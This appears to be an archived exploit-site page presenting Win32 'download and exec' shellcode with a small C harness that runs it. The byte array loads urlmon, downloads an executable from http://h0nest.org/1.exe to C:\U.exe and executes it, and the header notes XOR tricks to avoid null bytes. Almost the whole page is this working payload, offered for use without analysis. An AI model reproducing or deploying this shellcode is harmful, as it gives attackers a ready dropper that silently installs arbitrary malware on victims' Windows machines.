<html><head><title>Windows - download &amp; exec shellcode - 226 bytes+</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
\    ______________________WIN_SHELLCODE__________________________
/ :: win32 download &amp; exec shellcode                              ::
\ :: by Darkeagle of Unl0ck Research Team [http://exploiterz.org] ::
/ :: to avoid 0x00 use ^^xor^^ }:&gt;                                ::
\ :: greets goes to: Sowhat, 0x557 guys, 55k7 guys, RST/GHC guys. ::
/ ::_____________________________cya______________________________::
\
*/


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char sh4llcode[] =
&quot;\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03&quot;
&quot;\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74&quot;
&quot;\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E&quot;
&quot;\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03&quot;
&quot;\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C&quot;
&quot;\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40&quot;
&quot;\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C&quot;
&quot;\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC&quot;
&quot;\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F&quot;
&quot;\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB&quot;
&quot;\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83&quot;
&quot;\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF&quot;
&quot;\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF&quot;
&quot;http://h0nest.org/1.exe&quot;;

int main()
{

 void (*c0de)();
 printf(&quot;Win32 \&quot;download &amp; exec shellcode\&quot;\n&quot;);
 *(int*)&amp;c0de = sh4llcode;
 c0de();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
